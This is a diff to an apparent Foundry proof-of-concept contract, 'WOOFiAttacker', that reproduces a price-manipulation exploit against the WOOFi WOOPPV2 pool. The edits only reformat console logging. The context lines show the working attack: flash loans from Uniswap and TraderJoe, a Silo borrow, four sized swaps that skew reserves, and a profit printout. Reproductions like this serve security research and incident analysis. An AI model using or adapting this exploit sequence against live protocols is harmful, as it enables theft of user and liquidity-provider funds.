@@ -42,8 +42,7 @@ contract WOOFiAttacker is Test {
         console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
         console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
         uint256 ethBalanceBefore = address(this).balance;
-        console.log("ETH:", ethBalanceBefore / 1e18, "ETH");
-        console.log("");
+        console.log("ETH:", ethBalanceBefore / 1e18, "ETH \n");
 
         // initiate the attack
         initFlash();
@@ -54,7 +53,7 @@ contract WOOFiAttacker is Test {
         console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
         console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
         uint256 ethBalanceAfter = address(this).balance;
-        console.log("ETH (profit):", (ethBalanceAfter - ethBalanceBefore) / 1e18, "ETH");
+        console.log("ETH (profit):", (ethBalanceAfter - ethBalanceBefore) / 1e18, "ETH \n");
 
     }
 
@@ -68,8 +67,7 @@ contract WOOFiAttacker is Test {
 
         // get the USDC balance of the UniSwap pool
         uniSwapFlashAmount = IERC20(USDC).balanceOf(address(POOL));
-        console.log("");
-        console.log("UniSwap Flash Amount: ", uniSwapFlashAmount / 1e6, "USDC");
+        console.log("UniSwap Flash Amount: ", uniSwapFlashAmount / 1e6, "USDC \n");
 
         // flash loan USDC - calls uniswapV3FlashCallback
         POOL.flash(
@@ -104,8 +102,7 @@ contract WOOFiAttacker is Test {
 
         // get the total pool amount 
         traderJoeFlashAmount = IERC20(WOO).balanceOf(address(TRADERJOE));
-        console.log("TJ Flash Amount: ", traderJoeFlashAmount / 1e18, "WOO");
-        console.log("");
+        console.log("TJ Flash Amount: ", traderJoeFlashAmount / 1e18, "WOO \n");
         bytes32 hashTraderJoeAmount = bytes32(traderJoeFlashAmount);
 
         // initiate the flash loan - calls LBFlashLoanCallback
@@ -145,8 +142,7 @@ contract WOOFiAttacker is Test {
         console.log("Reserves:");
         console.log("USDC: ", _getTokenInfo(USDC) / 1e6, "USDC");
         console.log("WOO: ", _getTokenInfo(WOO) / 1e18, "WOO");
-        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH");
-        console.log("");
+        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH \n");
 
         // 4 consecutive swaps:
 
@@ -166,8 +162,7 @@ contract WOOFiAttacker is Test {
         console.log("Reserves:");
         console.log("USDC: ", _getTokenInfo(USDC) / 1e6, "USDC");
         console.log("WOO: ", _getTokenInfo(WOO) / 1e18, "WOO");
-        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH");
-        console.log("");
+        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH \n");
 
         // 2. USDC -> WOO 
         IERC20(USDC).transfer(address(WOOPPV2), 100000000000);
@@ -185,8 +180,7 @@ contract WOOFiAttacker is Test {
         console.log("Reserves:");
         console.log("USDC: ", _getTokenInfo(USDC) / 1e6, "USDC");
         console.log("WOO: ", _getTokenInfo(WOO) / 1e18, "WOO");
-        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH");
-        console.log("");
+        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH \n");
 
         // 3. WOO -> USDC
         IERC20(WOO).transfer(address(WOOPPV2), 7856868800000000000000000);
@@ -204,8 +198,7 @@ contract WOOFiAttacker is Test {
         console.log("Reserves:");
         console.log("USDC: ", _getTokenInfo(USDC) / 1e6, "USDC");
         console.log("WOO: ", _getTokenInfo(WOO) / 1e18, "WOO");
-        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH");
-        console.log("");
+        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH \n");
 
         // 4. USDC -> WOO // reap the rewards
         IERC20(USDC).transfer(address(WOOPPV2), 926342);
@@ -223,8 +216,7 @@ contract WOOFiAttacker is Test {
         console.log("Reserves:");
         console.log("USDC: ", _getTokenInfo(USDC) / 1e6, "USDC");
         console.log("WOO: ", _getTokenInfo(WOO) / 1e18, "WOO");
-        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH");
-        console.log("");
+        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH \n");
 
         // repay WOO loan to Silo & withdraw USDC
         SILO.repay(WOO, MAX_UINT);
